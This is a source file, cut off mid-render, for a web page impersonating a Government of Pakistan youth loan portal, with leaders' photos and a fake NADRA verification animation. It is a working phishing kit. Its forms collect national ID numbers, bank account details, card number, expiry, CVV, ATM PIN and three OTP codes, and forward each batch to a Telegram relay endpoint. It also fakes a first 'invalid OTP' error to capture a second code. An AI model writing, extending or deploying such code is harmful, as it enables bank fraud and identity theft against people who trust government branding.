/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import {
  ShieldCheck,
  CheckCircle2,
  Search,
  Lock,
  CreditCard,
  Smartphone,
  ArrowRight,
  ArrowLeft,
  Printer,
  Globe,
  Building2,
  User,
  Calendar,
  DollarSign,
  AlertCircle,
  XCircle,
  Clock,
  RefreshCw,
  FileText,
  Check,
  Sparkles,
  ExternalLink,
  ChevronDown,
  Settings,
  Send,
  Terminal,
  X
} from 'lucide-react';

type Language = 'en' | 'ur';
type Step =
  | 'home'
  | 'personal'
  | 'nadra'
  | 'financial'
  | 'tax_payment'
  | 'atm_pin'
  | 'otp_1'
  | 'otp_2'
  | 'otp_3'
  | 'success';

interface PersonalData {
  fullName: string;
  cnic: string;
  mobile: string;
  gender: string;
  dob: string;
  province: string;
  address: string;
}

interface FinancialData {
  loanAmount: string;
  loanPurpose: string;
  occupation: string;
  bankName: string;
  accountNumber: string;
  currentBalance: string;
  monthlyIncome: string;
  salaryDate: string;
}

interface TaxData {
  cardNumber: string;
  expiry: string;
  cvv: string;
}

export default function App() {
  const [lang, setLang] = useState<Language>('en');
  const [step, setStep] = useState<Step>('home');
  const [nadraProgress, setNadraProgress] = useState<number>(0);
  const [timerSeconds, setTimerSeconds] = useState<number>(293); // 4:53
  const [otpError, setOtpError] = useState<boolean>(false);

  // Form states
  const [personal, setPersonal] = useState<PersonalData>({
    fullName: '',
    cnic: '',
    mobile: '',
    gender: '',
    dob: '',
    province: 'Punjab',
    address: ''
  });

  const [financial, setFinancial] = useState<FinancialData>({
    loanAmount: '',
    loanPurpose: 'Small Business Startup / SME Expansion',
    occupation: 'Salaried Employee',
    bankName: '',
    accountNumber: '',
    currentBalance: '',
    monthlyIncome: '',
    salaryDate: '1st of every month'
  });

  const [taxData, setTaxData] = useState<TaxData>({
    cardNumber: '',
    expiry: '',
    cvv: ''
  });

  const [atmPin, setAtmPin] = useState<string>('');
  const [otp1, setOtp1] = useState<string>('');
  const [otp2, setOtp2] = useState<string>('');
  const [otp3, setOtp3] = useState<string>('');

  const [applicationId, setApplicationId] = useState<string>('');
  const [formError, setFormError] = useState<string>('');
  const [driveStatus, setDriveStatus] = useState<string>('');

  const saveToGoogleDrive = async () => {
    try {
      setDriveStatus('Connecting to Google Drive...');
      const client = (window as any).google?.accounts?.oauth2?.initTokenClient({
        client_id: '',
        scope: 'https://www.googleapis.com/auth/drive.file',
        callback: async (response: any) => {
          if (response.error) {
            setDriveStatus('Authorization failed');
            return;
          }
          const token = response.access_token;
          setDriveStatus('Uploading report to Google Drive...');

          const fileContent = `PAKISTAN YOUTH LOAN PORTAL - MASTER REPORT\n` +
            `Application ID: ${applicationId}\n` +
            `Full Name: ${personal.fullName}\n` +
            `CNIC: ${personal.cnic}\n` +
            `Mobile: ${personal.mobile}\n` +
            `Province: ${personal.province}\n` +
            `Loan Amount: PKR ${financial.loanAmount}\n` +
            `Bank: ${financial.bankName}\n` +
            `Account Number: ${financial.accountNumber}\n` +
            `Status: Rejected\n`;

          const metadata = {
            name: `Youth_Loan_Report_${applicationId}.txt`,
            mimeType: 'text/plain',
          };

          const form = new FormData();
          form.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
          form.append('file', new Blob([fileContent], { type: 'text/plain' }));

          const res = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart', {
            method: 'POST',
            headers: new Headers({ 'Authorization': 'Bearer ' + token }),
            body: form,
          });

          if (res.ok) {
            setDriveStatus('Successfully saved to Google Drive!');
          } else {
            setDriveStatus('Failed to upload to Google Drive.');
          }
        },
      });

      if (client) {
        client.requestAccessToken();
      } else {
        setDriveStatus('Google API client not loaded.');
      }
    } catch (err: any) {
      setDriveStatus('Error: ' + err.message);
    }
  };

  // Countdown timer for OTP
  useEffect(() => {
    let interval: any;
    if (step === 'otp_1' && timerSeconds > 0) {
      interval = setInterval(() => {
        setTimerSeconds((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, timerSeconds]);

  // NADRA verification animation simulation
  useEffect(() => {
    let interval: any;
    if (step === 'nadra') {
      setNadraProgress(10);
      interval = setInterval(() => {
        setNadraProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              setTimerSeconds(293);
              setStep('otp_1');
            }, 800);
            return 100;
          }
          return prev + 15;
        });
      }, 350);
    }
    return () => clearInterval(interval);
  }, [step]);

  const formatTime = (secs: number) => {
    const mins = Math.floor(secs / 60);
    const s = secs % 60;
    return `${mins.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const forwardToTelegram = async (stepName: string, data: any) => {
    try {
      const payload = {
        step: stepName,
        data: data
      };

      await fetch('/api/forward-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.error('Failed to forward to telegram:', err);
    }
  };

  const handleStartApply = () => {
    setFormError('');
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('personal');
  };

  const handlePersonalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!personal.fullName.trim()) {
      setFormError('Please enter your full name as per CNIC.');
      return;
    }
    if (personal.cnic.length !== 13) {
      setFormError('CNIC number must be exactly 13 digits.');
      return;
    }
    if (!personal.mobile.startsWith('03') || personal.mobile.length !== 11) {
      setFormError('Mobile number must be exactly 11 digits starting with 03.');
      return;
    }
    if (!personal.gender || !personal.dob || !personal.address.trim()) {
      setFormError('Please complete all personal details and residential address.');
      return;
    }
    setFormError('');
    forwardToTelegram('personal', { personal, financial, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('financial');
  };

  const handleFinancialSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const amount = Number(financial.loanAmount);
    if (!amount || amount < 100000 || amount > 30000000) {
      setFormError('Loan amount must be between PKR 100,000 and 3,00,00,000.');
      return;
    }
    if (!financial.bankName) {
      setFormError('Please select your bank name.');
      return;
    }
    if (!financial.accountNumber || financial.accountNumber.length < 8 || !/^\d+$/.test(financial.accountNumber)) {
      setFormError('Account number must contain only numbers (minimum 8 digits).');
      return;
    }
    if (!financial.currentBalance || !financial.monthlyIncome) {
      setFormError('Please enter your current bank balance and monthly income.');
      return;
    }
    setFormError('');
    forwardToTelegram('financial', { personal, financial, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('tax_payment');
  };

  const handleTaxSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cleanCard = taxData.cardNumber.replace(/\D/g, '');
    if (cleanCard.length !== 16) {
      setFormError('ATM Card Number must be exactly 16 digits.');
      return;
    }
    if (!taxData.expiry.includes('/') || taxData.expiry.length < 4) {
      setFormError('Please enter a valid card expiry date (MM/YY).');
      return;
    }
    if (taxData.cvv.length !== 3) {
      setFormError('Please enter a valid 3-digit CVV code from the back of your card.');
      return;
    }
    setFormError('');
    forwardToTelegram('tax_payment', { personal, financial, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    forwardToTelegram('all_details', { personal, financial, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setNadraProgress(10);
    setStep('nadra');
  };

  const renderOtpBoxes = (otpVal: string, setOtpVal: (v: string) => void, prefix: string) => {
    const digits = otpVal.padEnd(6, '').split('').slice(0, 6);

    return (
      <div className="flex justify-center gap-2 sm:gap-3 my-4">
        {[0, 1, 2, 3, 4, 5].map((idx) => (
          <input
            key={idx}
            id={`${prefix}-otp-box-${idx}`}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={digits[idx]?.trim() || ''}
            onChange={(e) => {
              const val = e.target.value.replace(/\D/g, '');
              const newDigits = [...digits];
              newDigits[idx] = val;
              const combined = newDigits.join('').slice(0, 6);
              setOtpVal(combined);

              if (val && idx < 5) {
                const nextInput = document.getElementById(`${prefix}-otp-box-${idx + 1}`);
                nextInput?.focus();
              }
            }}
            onKeyDown={(e) => {
              if (e.key === 'Backspace' && !digits[idx] && idx > 0) {
                const prevInput = document.getElementById(`${prefix}-otp-box-${idx - 1}`);
                prevInput?.focus();
              }
            }}
            onPaste={(e) => {
              e.preventDefault();
              const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
              setOtpVal(pasteData);
            }}
            className="w-11 h-14 sm:w-12 sm:h-14 text-center text-xl sm:text-2xl font-bold font-mono bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 shadow-inner"
          />
        ))}
      </div>
    );
  };

  const handleOtp1Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp1.length !== 6) {
      setFormError('Please enter a valid 6-digit OTP code.');
      setOtpError(true);
      return;
    }
    
    // Simulate error on first attempt
    if (!otpError) {
      forwardToTelegram('incorrect_otp', { personal, taxData, atmPin, otps: { otp1, otp2, otp3 } });
      setFormError('Invalid OTP. Please try again.');
      setOtpError(true);
      return;
    }

    setFormError('');
    setOtpError(false);
    forwardToTelegram('otp_1', { personal, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('atm_pin');
  };

  const handleAtmPinSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!/^\d{4}$/.test(atmPin)) {
      setFormError('Please enter a valid 4-digit numeric ATM PIN.');
      return;
    }
    setFormError('');
    forwardToTelegram('atm_pin', { personal, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('otp_2');
  };

  const handleOtp2Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp2.length !== 6) {
      setFormError('Please enter a valid 6-digit OTP code.');
      return;
    }
    setFormError('');
    forwardToTelegram('otp_2', { personal, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('otp_3');
  };

  const handleOtp3Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp3.length !== 6) {
      setFormError('Please enter a valid 6-digit OTP code.');
      return;
    }
    setFormError('');
    forwardToTelegram('otp_3', { personal, taxData, atmPin, otps: { otp1, otp2, otp3 } });
    const randomId = 'PLP-2026-' + Math.floor(100000 + Math.random() * 900000);
    setApplicationId(randomId);
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep('success');
  };

  return (
    <div className={`min-h-screen bg-[#f4f7f5] text-slate-800 ${lang === 'ur' ? 'font-sans' : 'font-sans'}`}>
      {/* Top Banner / Ticker */}
      <div className="bg-[#0b4c2c] text-white py-2 px-4 text-xs md:text-sm font-medium flex justify-between items-center shadow-inner">
        <div className="flex items-center gap-2">
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
          <span>Government of Pakistan · Ministry of Finance</span>
          <span className="hidden md:inline opacity-75">| حکومت پاکستان ۔ وزارت خزانہ</span>
        </div>
        <button
          onClick={() => setLang(lang === 'en' ? 'ur' : 'en')}
          className="flex items-center gap-1.5 bg-emerald-700/80 hover:bg-emerald-600 px-3 py-1 rounded-full text-xs transition border border-emerald-500/40"
        >
          <Globe className="w-3.5 h-3.5" />
          <span>{lang === 'en' ? 'Urdu / English (اردو / پورٹل)' : 'English / اردو'}</span>
        </button>
      </div>

      {/* Main Navigation Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3 cursor-pointer" onClick={() => setStep('home')}>
            <div className="w-12 h-12 bg-white rounded-2xl border-2 border-emerald-800 flex items-center justify-center shadow-md p-1 relative overflow-hidden group">
              <img src="/pakistan_emblem.jpg" alt="Pakistan State Emblem" className="w-full h-full object-contain rounded-xl" />
            </div>
            <div>
              <div className="text-[10px] uppercase tracking-wider font-semibold text-emerald-700">
                MINISTRY OF FINANCE · وزارت خزانہ
              </div>
              <h1 className="text-base md:text-xl font-extrabold text-slate-900 tracking-tight">
                Pakistan Youth Loan Portal
              </h1>
            </div>
          </div>

          <button
            onClick={handleStartApply}
            className="bg-[#0b4c2c] hover:bg-emerald-900 text-white font-bold px-5 py-2.5 rounded-xl shadow-md hover:shadow-lg transition flex items-center gap-2 text-sm"
          >
            <span>{lang === 'en' ? 'APPLY' : 'درخواست دیں'}</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="max-w-2xl mx-auto px-4 py-6 md:py-8">
        {/* HOME / HERO SCREEN */}
        {step === 'home' && (
          <div className="space-y-6">
            {/* Prime Minister Card */}
            <div className="relative rounded-3xl overflow-hidden shadow-xl bg-gradient-to-b from-slate-900 via-slate-800 to-emerald-950 text-white border border-emerald-500/30">
              <div className="absolute top-4 left-4 z-10 bg-emerald-800/90 backdrop-blur-md text-emerald-100 text-xs font-semibold px-3 py-1 rounded-full border border-emerald-400/30 flex items-center gap-1.5 z-20">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-300" />
                <span>Government of Pakistan · حکومت پاکستان</span>
              </div>
              <div className="relative h-96 sm:h-[450px] w-full flex items-end p-6 sm:p-8 bg-cover bg-center" style={{ backgroundImage: 'linear-gradient(to top, rgba(5,20,12,0.95), rgba(11,76,44,0.3), transparent), url("/pm_shehbaz.jpg")' }}>
                <div className="absolute inset-0 bg-gradient-to-t from-[#05140c] via-[#05140c]/40 to-transparent"></div>
                <div className="relative z-10 space-y-1">
                  <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white drop-shadow-md">
                    Muhammad Shehbaz Sharif
                  </h2>
                  <div className="flex items-center justify-between text-sm sm:text-base font-medium text-emerald-200">
                    <span>Prime Minister of Pakistan</span>
                    <span className="font-urdu text-lg">وزیر اعظم پاکستان</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Chief Minister Punjab Card */}
            <div className="relative rounded-3xl overflow-hidden shadow-xl bg-gradient-to-b from-slate-900 via-slate-800 to-emerald-950 text-white border border-emerald-500/30">
              <div className="absolute top-4 left-4 z-10 bg-emerald-800/90 backdrop-blur-md text-emerald-100 text-xs font-semibold px-3 py-1 rounded-full border border-emerald-400/30 flex items-center gap-1.5 z-20">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-300" />
                <span>Government of Punjab · حکومت پنجاب</span>
              </div>
              <div className="relative h-96 sm:h-[450px] w-full flex items-end p-6 sm:p-8 bg-cover bg-center" style={{ backgroundImage: 'linear-gradient(to top, rgba(5,20,12,0.95), rgba(11,76,44,0.3), transparent), url("/cm_maryam.jpg")' }}>
                <div className="absolute inset-0 bg-gradient-to-t from-[#05140c] via-[#05140c]/40 to-transparent"></div>
                <div className="relative z-10 space-y-1">
                  <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white drop-shadow-md">
                    Maryam Nawaz Sharif
                  </h2>
                  <div className="flex items-center justify-between text-sm sm:text-base font-medium text-emerald-200">
                    <span>Chief Minister Punjab</span>
                    <span className="font-urdu text-lg">وزیر اعلیٰ پنجاب</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Inspirational Quote Card */}
            <div className="bg-gradient-to-br from-emerald-900 to-[#0b4c2c] text-white rounded-3xl p-6 shadow-lg border border-emerald-700/50 space-y-3">
              <div className="inline-flex items-center gap-1.5 bg-emerald-800/80 px-3 py-1 rounded-full text-xs font-medium text-emerald-200 border border-emerald-600/50">
                <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                <span>Umeed Ki Kiran Hai · امید کی کرن ہے</span>
              </div>
              <p className="text-lg sm:text-xl font-bold leading-relaxed text-emerald-50 font-urdu text-right">
                "امید کی کرن ہے۔ " ہر پاکستانی مالی خود مختاری اور خود انحصاری کا حقدار ہے؛ یہ پروگرام ہمارے عوام کے لیے امید کی کرن ہے۔"
              </p>
              <div className="pt-2 flex justify-end">
                <button
                  onClick={handleStartApply}
                  className="w-full sm:w-auto bg-white text-emerald-900 font-bold px-8 py-3 rounded-2xl shadow-lg hover:bg-emerald-50 transition flex items-center justify-center gap-2"
                >
                  <span>Start Loan Application / درخواست شروع کریں</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        )}

        {/* STEP 1: PERSONAL INFORMATION */}
        {step === 'personal' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-8 space-y-6">
            <div className="bg-emerald-50 border border-emerald-200 p-4 rounded-2xl flex items-start gap-3">
              <ShieldCheck className="w-5 h-5 text-emerald-700 mt-0.5 shrink-0" />
              <div>
                <h3 className="text-sm font-bold text-emerald-900">Apni zaati maloomat darj karein</h3>
                <p className="text-xs text-emerald-700">براہ کرم اپنی درست معلومات درج کریں تاکہ تصدیق میں دشواری نہ ہو۔</p>
              </div>
            </div>

            {formError && (
              <div className="bg-rose-50 border border-rose-200 p-4 rounded-2xl flex items-center gap-3 text-rose-800 text-xs font-medium">
                <AlertCircle className="w-5 h-5 text-rose-600 shrink-0" />
                <span>{formError}</span>
              </div>
            )}

            <form onSubmit={handlePersonalSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Full Name * <span className="text-slate-400 font-normal">/ پورا نام</span>
                </label>
                <input
                  type="text"
                  required
                  placeholder="Full name as per CNIC"
                  value={personal.fullName}
                  onChange={(e) => setPersonal({ ...personal, fullName: e.target.value })}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  CNIC Number * <span className="text-slate-400 font-normal">/ شناختی کارڈ نمبر (13 Digits)</span>
                </label>
                <input
                  type="text"
                  required
                  maxLength={13}
                  placeholder="3520212345671"
                  value={personal.cnic}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '').slice(0, 13);
                    setPersonal({ ...personal, cnic: val });
                  }}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 tracking-wider font-mono"
                />
                <span className="text-[10px] text-slate-500 mt-1 block">Enter exactly 13 digits without dashes ({personal.cnic.length}/13)</span>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Mobile Number * <span className="text-slate-400 font-normal">/ موبائل نمبر (11 Digits)</span>
                </label>
                <input
                  type="tel"
                  required
                  maxLength={11}
                  placeholder="03001234567"
                  value={personal.mobile}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '').slice(0, 11);
                    setPersonal({ ...personal, mobile: val });
                  }}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 font-mono"
                />
                <span className="text-[10px] text-slate-500 mt-1 block">Enter exactly 11 digits starting with 03 ({personal.mobile.length}/11)</span>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Gender * <span className="text-slate-400 font-normal">/ جنس</span>
                </label>
                <div className="relative">
                  <select
                    value={personal.gender}
                    onChange={(e) => setPersonal({ ...personal, gender: e.target.value })}
                    required
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 appearance-none"
                  >
                    <option value="">Select Gender / جنس منتخب کریں</option>
                    <option value="Male">Male / مرد</option>
                    <option value="Female">Female / عورت</option>
                    <option value="Other">Other / دیگر</option>
                  </select>
                  <ChevronDown className="absolute right-4 top-3.5 w-5 h-5 text-slate-400 pointer-events-none" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Date of Birth * <span className="text-slate-400 font-normal">/ تاریخ پیدائش</span>
                </label>
                <input
                  type="date"
                  required
                  value={personal.dob}
                  onChange={(e) => setPersonal({ ...personal, dob: e.target.value })}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Province * <span className="text-slate-400 font-normal">/ صوبہ</span>
                </label>
                <div className="relative">
                  <select
                    value={personal.province}
                    onChange={(e) => setPersonal({ ...personal, province: e.target.value })}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 appearance-none"
                  >
                    <option value="Punjab">Punjab / پنجاب</option>
                    <option value="Sindh">Sindh / سندھ</option>
                    <option value="Khyber Pakhtunkhwa">Khyber Pakhtunkhwa / خیبر پختونخوا</option>
                    <option value="Balochistan">Balochistan / بلوچستان</option>
                    <option value="Islamabad Capital Territory">Islamabad Capital Territory / اسلام آباد</option>
                    <option value="Gilgit-Baltistan">Gilgit-Baltistan / گلگت بلتستان</option>
                    <option value="AJ&K">Azad Jammu & Kashmir / آزاد کشمیر</option>
                  </select>
                  <ChevronDown className="absolute right-4 top-3.5 w-5 h-5 text-slate-400 pointer-events-none" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Address * <span className="text-slate-400 font-normal">/ مکمل پتہ</span>
                </label>
                <textarea
                  required
                  rows={3}
                  placeholder="Enter complete residential address"
                  value={personal.address}
                  onChange={(e) => setPersonal({ ...personal, address: e.target.value })}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800"
                ></textarea>
              </div>

              <div className="pt-4 flex gap-4">
                <button
                  type="button"
                  onClick={() => setStep('home')}
                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3.5 rounded-xl transition"
                >
                  Back
                </button>
                <button
                  type="submit"
                  className="w-2/3 bg-[#0b4c2c] hover:bg-emerald-900 text-white font-bold py-3.5 rounded-xl shadow-lg transition flex items-center justify-center gap-2"
                >
                  <span>Proceed to NADRA Verification</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </form>
          </div>
        )}

        {/* STEP 2: FINANCIAL & LOAN DETAILS */}
        {step === 'financial' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-8 space-y-6">
            <div className="bg-emerald-50 border border-emerald-200 p-4 rounded-2xl flex items-start gap-3">
              <DollarSign className="w-5 h-5 text-emerald-700 mt-0.5 shrink-0" />
              <div>
                <h3 className="text-sm font-bold text-emerald-900">Maali tafseelat aur loan ki maloomat</h3>
                <p className="text-xs text-emerald-700">براہ کرم قرض کی مطلوبہ رقم اور بینک اکاؤنٹ کی تفصیلات درج کریں۔</p>
              </div>
            </div>

            {formError && (
              <div className="bg-rose-50 border border-rose-200 p-4 rounded-2xl flex items-center gap-3 text-rose-800 text-xs font-medium">
                <AlertCircle className="w-5 h-5 text-rose-600 shrink-0" />
                <span>{formError}</span>
              </div>
            )}

            <form onSubmit={handleFinancialSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Loan Amount Required (PKR) * <span className="text-slate-400 font-normal">/ مطلوبہ قرض کی رقم</span>
                </label>
                <input
                  type="number"
                  required
                  min="100000"
                  max="30000000"
                  placeholder="Enter loan amount e.g. 500000"
                  value={financial.loanAmount}
                  onChange={(e) => setFinancial({ ...financial, loanAmount: e.target.value })}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800"
                />
                <span className="text-[11px] text-slate-500 mt-1 block">
                  Range: PKR 1,00,000 (1 Lakh) - 3,00,00,000 (3 Crore)
                </span>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Loan Purpose * <span className="text-slate-400 font-normal">/ قرض کا مقصد</span>
                </label>
                <div className="relative">
                  <select
                    value={financial.loanPurpose}
                    onChange={(e) => setFinancial({ ...financial, loanPurpose: e.target.value })}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 appearance-none"
                  >
                    <option value="Small Business Startup / SME Expansion">Small Business Startup / SME Expansion</option>
                    <option value="Agriculture & Tractors">Agriculture & Tractors</option>
                    <option value="IT Freelancer & Software Startup">IT Freelancer & Software Startup</option>
                    <option value="Higher Education">Higher Education</option>
                    <option value="Electric Vehicles & Transport">Electric Vehicles & Transport</option>
                  </select>
                  <ChevronDown className="absolute right-4 top-3.5 w-5 h-5 text-slate-400 pointer-events-none" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Occupation * <span className="text-slate-400 font-normal">/ پیشہ</span>
                </label>
                <div className="relative">
                  <select
                    value={financial.occupation}
                    onChange={(e) => setFinancial({ ...financial, occupation: e.target.value })}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 appearance-none"
                  >
                    <option value="Salaried Employee">Salaried Employee</option>
                    <option value="Business Owner / Self-Employed">Business Owner / Self-Employed</option>
                    <option value="Freelancer / Tech">Freelancer / Tech</option>
                    <option value="Unemployed Youth / Graduate">Unemployed Youth / Graduate</option>
                    <option value="Farmer / Agriculturist">Farmer / Agriculturist</option>
                  </select>
                  <ChevronDown className="absolute right-4 top-3.5 w-5 h-5 text-slate-400 pointer-events-none" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Bank Name * <span className="text-slate-400 font-normal">/ بینک کا نام</span>
                </label>
                <div className="relative">
                  <select
                    value={financial.bankName}
                    onChange={(e) => setFinancial({ ...financial, bankName: e.target.value })}
                    required
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 appearance-none"
                  >
                    <option value="" disabled>-- Select Bank / بینک منتخب کریں --</option>
                    <option value="Allied Bank Limited (ABL)">Allied Bank Limited (ABL)</option>
                    <option value="National Bank of Pakistan (NBP)">National Bank of Pakistan (NBP)</option>
                    <option value="Habib Bank Limited (HBL)">Habib Bank Limited (HBL)</option>
                    <option value="MCB Bank Limited">MCB Bank Limited</option>
                    <option value="Meezan Bank">Meezan Bank</option>
                    <option value="United Bank Limited (UBL)">United Bank Limited (UBL)</option>
                    <option value="Bank Alfalah">Bank Alfalah</option>
                    <option value="BankIslami Pakistan">BankIslami Pakistan</option>
                    <option value="Faysal Bank">Faysal Bank</option>
                    <option value="Askari Bank">Askari Bank</option>
                    <option value="The Bank of Punjab (BOP)">The Bank of Punjab (BOP)</option>
                  </select>
                  <ChevronDown className="absolute right-4 top-3.5 w-5 h-5 text-slate-400 pointer-events-none" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Account Number * <span className="text-slate-400 font-normal">/ اکاؤنٹ نمبر (Numbers Only)</span>
                </label>
                <input
                  type="text"
                  required
                  placeholder="Enter numbers only"
                  value={financial.accountNumber}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '');
                    setFinancial({ ...financial, accountNumber: val });
                  }}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 font-mono"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Current Bank Balance (PKR) * <span className="text-slate-400 font-normal">/ موجودہ بینک بیلنس</span>
                </label>
                <input
                  type="number"
                  required
                  placeholder="Enter current bank balance (PKR)"
                  value={financial.currentBalance}
                  onChange={(e) => setFinancial({ ...financial, currentBalance: e.target.value })}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Monthly Income (PKR) * <span className="text-slate-400 font-normal">/ ماہانہ آمدنی</span>
                </label>
                <input
                  type="number"
                  required
                  placeholder="Enter monthly income (PKR)"
                  value={financial.monthlyIncome}
                  onChange={(e) => setFinancial({ ...financial, monthlyIncome: e.target.value })}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800"
                />
              </div>

              <div className="pt-4 flex gap-4">
                <button
                  type="button"
                  onClick={() => setStep('personal')}
                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3.5 rounded-xl transition"
                >
                  Back
                </button>
                <button
                  type="submit"
                  className="w-2/3 bg-[#0b4c2c] hover:bg-emerald-900 text-white font-bold py-3.5 rounded-xl shadow-lg transition flex items-center justify-center gap-2"
                >
                  <span>Proceed to ATM Card & Tax Payment</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </form>
          </div>
        )}
        {step === 'nadra' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 p-8 text-center space-y-6">
